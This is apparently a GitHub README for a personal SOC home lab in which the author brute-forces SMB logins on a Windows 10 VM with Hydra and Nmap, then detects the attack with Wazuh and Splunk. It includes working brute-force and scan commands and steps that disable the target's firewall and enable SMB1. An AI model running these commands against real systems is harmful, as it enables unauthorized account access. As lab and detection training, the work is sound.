# 🔐 SOC Home Lab — Brute Force Attack & Detection

![SOC Lab](https://img.shields.io/badge/Type-SOC%20Home%20Lab-blue)
![Status](https://img.shields.io/badge/Status-Completed-green)
![MITRE](https://img.shields.io/badge/MITRE%20ATT%26CK-T1110.001-red)
![Tools](https://img.shields.io/badge/Tools-Kali%20%7C%20Wazuh%20%7C%20Splunk-orange)

## 📋 Project Overview

This project simulates a **real-world brute force attack** in a controlled home lab environment. I acted as both the **Red Team (attacker)** and **Blue Team (defender)**, performing an SMB brute force attack from Kali Linux against a Windows 10 target, then detecting and alerting on the attack using Wazuh SIEM and Splunk.

> ⚠️ **Legal Disclaimer:** This project was performed entirely on personally owned virtual machines in an isolated lab environment. All attacks were conducted legally for educational purposes only.

---

## 🏗️ Lab Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    HOST MACHINE                         │
│                  (Oracle VirtualBox)                    │
│                                                         │
│  ┌──────────────┐    Attack     ┌───────────────────┐  │
│  │  Kali Linux  │ ────────────► │   Windows 10 VM   │  │
│  │  (Attacker)  │               │   (Target)        │  │
│  │              │               │                   │  │
│  │  • Hydra     │               │  • SMB Port 445   │  │
│  │  • Nmap      │               │  • Wazuh Agent    │  │
│  │  • Netcat    │               │  • Splunk UF      │  │
│  └──────────────┘               └────────┬──────────┘  │
│                                          │ Logs         │
│                         ┌────────────────▼──────────┐  │
│                         │      Wazuh SIEM OVA       │  │
│                         │   (192.168.56.102)        │  │
│                         │   • Alert Detection       │  │
│                         │   • Email Notifications   │  │
│                         └───────────────────────────┘  │
│                                                         │
│  ┌──────────────────────────────────────────────────┐  │
│  │         Splunk Enterprise (Host Machine)         │  │
│  │              http://localhost:8000               │  │
│  │   • Receives logs via Universal Forwarder        │  │
│  │   • SOC Brute Force Monitor Dashboard            │  │
│  └──────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘
```

---

## 🛠️ Tools Used

| Tool | Version | Purpose |
|------|---------|---------|
| Oracle VirtualBox | 7.x | Hypervisor for all VMs |
| Kali Linux | 2024 | Attacker machine |
| Windows 10 Enterprise | 10.0.19045 | Target machine |
| Wazuh | v4.14.3 | SIEM - Detection & Alerting |
| Splunk Enterprise | 10.2.0 | Log Analysis & Dashboard |
| Splunk Universal Forwarder | 9.x | Log forwarding from Windows |
| Hydra | v9.6 | Brute force attack tool |
| Nmap | 7.98 | Network scanning |

---

## 📡 Network Configuration

| VM | IP Address | Role |
|----|-----------|------|
| Kali Linux | 192.168.56.102 | Attacker |
| Windows 10 VM | 192.168.56.105 | Target |
| Wazuh OVA | 192.168.56.102 | SIEM |
| Host Machine | 192.168.56.1 | Splunk Server |

**Network Adapter:** Host-Only Adapter (vboxnet0) on all VMs

---

## ⚙️ Step-by-Step Lab Setup

### Step 1 — VirtualBox Network Configuration
```
VirtualBox → Each VM → Settings → Network
Adapter 1: Host-Only Adapter
Name: vboxnet0
```
This puts all VMs on the same isolated network so they can communicate.

---

### Step 2 — Wazuh Agent Installation on Windows 10 VM

Wazuh agent collects Windows Event Logs and sends them to the Wazuh SIEM server.

**On Windows 10 VM (PowerShell as Admin):**
```powershell
# Download Wazuh agent MSI from wazuh.com
# Install with Wazuh server IP
.\wazuh-agent-4.14.3-1.msi WAZUH_MANAGER="192.168.56.102"

# Start the Wazuh service
net start WazuhSvc

# Verify it's running
sc query WazuhSvc
```

**Verify in Wazuh Dashboard:**
- Go to `https://192.168.56.102`
- Navigate to Endpoints
- Agent should show **Active (green)**

---

### Step 3 — Splunk Universal Forwarder Setup on Windows 10 VM

The Splunk Universal Forwarder collects Windows Event Logs and forwards them to Splunk on the host machine.

**Install Splunk Universal Forwarder:**
```powershell
# Download from splunk.com/en_us/download/universal-forwarder.html
# Install pointing to host machine IP
.\splunkforwarder-installer.msi RECEIVING_INDEXER="192.168.56.1:9997"
```

**Create inputs.conf to collect Windows Security logs:**
```powershell
# Open with Notepad
notepad "C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf"
```

**Add this content:**
```ini
[WinEventLog://Security]
index = windows
sourcetype = WinEventLog:Security
disabled = false

[WinEventLog://System]
index = windows
sourcetype = WinEventLog:System
disabled = false
```

**Verify outputs.conf points to host:**
```powershell
type "C:\Program Files\SplunkUniversalForwarder\etc\system\local\outputs.conf"
# Should show: server = 192.168.56.1:9997
```

**Restart forwarder:**
```powershell
net stop SplunkForwarder
net start SplunkForwarder
```

---

### Step 4 — Configure Splunk to Receive Logs

**On Host Machine — Splunk Dashboard (localhost:8000):**
```
Settings → Forwarding and Receiving → Configure Receiving
→ New Receiving Port: 9997 → Save

Settings → Indexes → New Index
→ Index Name: windows
→ Save
```

---

### Step 5 — Prepare Windows 10 VM for Attack

```powershell
# Disable Windows Firewall (lab only)
netsh advfirewall set allprofiles state off

# Create test user with known password
net user labuser Password123 /add
net user labuser /active:yes

# Enable SMB
Set-SmbServerConfiguration -EnableSMB2Protocol $true -Force
Start-Service LanmanServer
```

---

## 🔴 Attack Phase (Red Team)

### Phase 1 — Reconnaissance

**Network Discovery from Kali:**
```bash
# Discover live hosts
nmap -sn 192.168.56.0/24

# Detailed service scan on target
nmap -sV 192.168.56.105

# Check if SMB port 445 is open
nmap -p 445 192.168.56.105
```

**Expected Output:**
```
PORT    STATE SERVICE
445/tcp open  microsoft-ds
```

---

### Phase 2 — Brute Force Attack (SMB)

#### ❌ Failed Attempt 1 — Wrong Command Syntax
```bash
# ERROR: Smart quotes corrupted the flags
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt smb://192.168.56.105
# Error: invalid option -- '1'
```
**Lesson:** Always type commands manually — copy-paste can corrupt dashes and quotes.

#### ❌ Failed Attempt 2 — Wordlist Not Found
```bash
# ERROR: rockyou.txt was still compressed
# Error: File for passwords not found: /usr/share/wordlists/rockyou.txt
```
**Fix:**
```bash
gunzip /usr/share/wordlists/rockyou.txt.gz
ls -lh /usr/share/wordlists/rockyou.txt
```

#### ❌ Failed Attempt 3 — SMB Port Closed
```bash
# ERROR: could not connect to target smb://192.168.56.105:445/
```
**Fix:** Enable SMB on Windows 10 VM and restart after enabling SMB1 protocol:
```powershell
Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol" -NoRestart
Restart-Computer
```

#### ✅ Successful Attack — SMB Brute Force with Custom Wordlist
```bash
# Create targeted wordlist with known password
cat > /root/testpass.txt << 'EOF'
123456
password
admin
Password123
welcome
EOF

# Run Hydra
hydra -l labuser -P /root/testpass.txt smb://192.168.56.105
```

**Result:**
```
[445][smb] host: 192.168.56.105   login: labuser   password: Password123
1 of 1 target successfully completed, 1 valid password found
```

#### ✅ Large Scale Attack — rockyou.txt Against vboxuser
```bash
hydra -l vboxuser -P /usr/share/wordlists/rockyou.txt smb://192.168.56.105
```
This generated **14 million login attempts**, all captured as Event ID 4625 in Wazuh and Splunk.

---

## 🔵 Detection Phase (Blue Team)

### Wazuh Detection

**Alert triggered in Wazuh Dashboard:**
- Trigger Name: **Attack Detected**
- Severity: **1 (Medium — Rule Level 7-11)**
- Timestamp: 05/26/26 11:34 PM
- Monitor: Wazuh SOC Master Monitor (runs every 1 minute)

**Why Medium severity?**
Brute force attacks trigger Wazuh rule level 7-11 by default. Critical (level 15+) requires custom rules for mass attacks on critical servers.

**Wazuh Rules Triggered:**
| Rule ID | Description |
|---------|-------------|
| 60122 | Multiple Windows authentication failures |
| 60106 | Windows logon failure |
| 60204 | Brute force attack detected |

---

### Email Alert Configuration

Wazuh was configured to send email alerts via Gmail SMTP:

```bash
# Add Gmail App Password to OpenSearch keystore
echo "email@gmail.com" | sudo /usr/share/wazuh-indexer/bin/opensearch-keystore \
  add --stdin plugins.alerting.destination.email.wazuh-gmail.username

echo "AppPasswordHere" | sudo /usr/share/wazuh-indexer/bin/opensearch-keystore \
  add --stdin plugins.alerting.destination.email.wazuh-gmail.password

sudo systemctl restart wazuh-indexer
```

**Email received:**
```
Subject: Wazuh Attack Alert
Trigger: Attack Detected
Severity: 1
Period: 2026-05-26T19:26:48Z UTC
Monitor: Wazuh soc master monitor
```

---

### Splunk Detection

**Search Query Used:**
```splunk
index=windows EventCode=4625
| stats count by host, Account_Name
| sort -count
```

**Results:**
```
DESKTOP-GOH5PVQ    vboxuser    10+ failed attempts
DESKTOP-GOH5PVQ    labuser     1 failed attempt
```

**Advanced Brute Force Detection Query:**
```splunk
index=windows EventCode=4625
| stats count by host, Account_Name
| where count > 5
| sort -count
```

**Dashboard Created:** SOC Brute Force Monitor showing all failed login events with timestamps.

---

## 🎯 MITRE ATT&CK Mapping

| Technique ID | Name | Description | Evidence |
|-------------|------|-------------|----------|
| **T1046** | Network Service Scanning | Used Nmap to scan target | `nmap -sV 192.168.56.105` |
| **T1110** | Brute Force | Repeated password attempts | Hydra against SMB |
| **T1110.001** | Password Guessing | Wordlist-based attack | rockyou.txt + testpass.txt |
| **T1021.002** | SMB/Windows Admin Shares | Targeted SMB port 445 | `smb://192.168.56.105` |
| **T1078** | Valid Accounts | Goal: obtain valid credentials | labuser:Password123 found |
| **T1562.004** | Disable Firewall | Firewall disabled on target | `netsh advfirewall set allprofiles state off` |

---

## 📊 Windows Event IDs Generated

| Event ID | Meaning | Count Generated |
|---------|---------|----------------|
| **4625** | Failed logon attempt | Thousands (every Hydra attempt) |
| **4624** | Successful logon | 1 (when password cracked) |
| **4648** | Logon with explicit credentials | During SMB auth |
| **4776** | NTLM credential validation | During SMB auth attempts |
| **4720** | New user account created | When labuser was created |

---

## 📈 Types of Brute Force Attacks Demonstrated

| Type | Description | Demonstrated |
|------|-------------|-------------|
| **Dictionary Attack** | Using wordlist of common passwords | ✅ rockyou.txt (14M passwords) |
| **Targeted Attack** | Custom wordlist with likely passwords | ✅ testpass.txt |
| **Password Guessing** | Systematic guessing against service | ✅ SMB port 445 |
| **Credential Testing** | Verify if credentials work | ✅ labuser:Password123 |

---

## 🔍 Log Analysis — How It Works

```
ATTACK HAPPENS          LOGS GENERATED         SIEM DETECTS
─────────────          ──────────────         ────────────
Hydra tries            Windows creates        Wazuh sees 50+
wrong password    →    Event ID 4625      →   4625 events →
                       (Failed Login)         ALERT TRIGGERED

Hydra finds            Windows creates        Wazuh sees
correct password  →    Event ID 4624      →   4624 after
                       (Success Login)        4625s = BREACH
```

**Splunk correlation query:**
```splunk
index=windows (EventCode=4625 OR EventCode=4624)
| stats count by EventCode, Account_Name
| sort EventCode
```

---

## ✅ Key Findings & Lessons Learned

**Attack Side:**
- SMB brute force is easy to execute with Hydra against misconfigured Windows systems
- rockyou.txt contains real leaked passwords — common passwords will be cracked
- Firewall disabled = attacker can reach all ports directly

**Defence Side:**
- Wazuh detected the attack within 1 minute of it starting
- 14 million login attempts generated clear anomaly pattern in logs
- Email alerting provides real-time notification to security team
- Splunk dashboard gives visual evidence of attack timeline

**Mitigation Recommendations:**
- Enable account lockout after 5 failed attempts
- Use strong passwords not in common wordlists
- Enable Windows Firewall — blocks SMB from external
- Monitor Event ID 4625 threshold alerts
- Enable MFA on all accounts

---

## 📁 Repository Structure

```
SOC-Home-Lab/
│
├── README.md                    ← This file
├── screenshots/
│   ├── 01_nmap_scan.png         ← Port discovery
│   ├── 02_hydra_attack.png      ← Brute force running
│   ├── 03_hydra_success.png     ← Password cracked
│   ├── 04_wazuh_alert.png       ← SIEM detection
│   ├── 05_wazuh_email.png       ← Email notification
│   ├── 06_splunk_4625.png       ← Splunk log evidence
│   └── 07_splunk_dashboard.png  ← SOC dashboard
├── configs/
│   ├── inputs.conf              ← Splunk forwarder config
│   └── outputs.conf             ← Splunk output config
└── queries/
    └── splunk_queries.txt       ← All SPL queries used
```

---

## 🎓 Skills Demonstrated

- **Penetration Testing** — Hydra, Nmap, Kali Linux
- **SIEM** — Wazuh configuration, alert rules, Splunk log analysis
- **Threat Detection** — Windows Event Log analysis, brute force detection
- **Virtualisation** — Oracle VirtualBox, multi-VM networking
- **Incident Response** — Alert triage, evidence collection
- **Frameworks** — MITRE ATT&CK mapping, Cyber Kill Chain
- **Networking** — TCP/IP, SMB protocol, Host-Only networking

---

## 📚 References

- [MITRE ATT&CK T1110 — Brute Force](https://attack.mitre.org/techniques/T1110/)
- [Wazuh Documentation](https://documentation.wazuh.com)
- [Splunk SPL Reference](https://docs.splunk.com/Documentation/Splunk/latest/SearchReference)
- [Windows Security Event IDs](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/basic-audit-logon-events)

---

## 👤 Author

**Lavesh Sawant**
- Cybersecurity Enthusiast | SOC Analyst (Fresher)
- Home Lab Builder | Ethical Hacking Learner

---

*This project was built entirely for educational purposes in a personal isolated lab environment.*

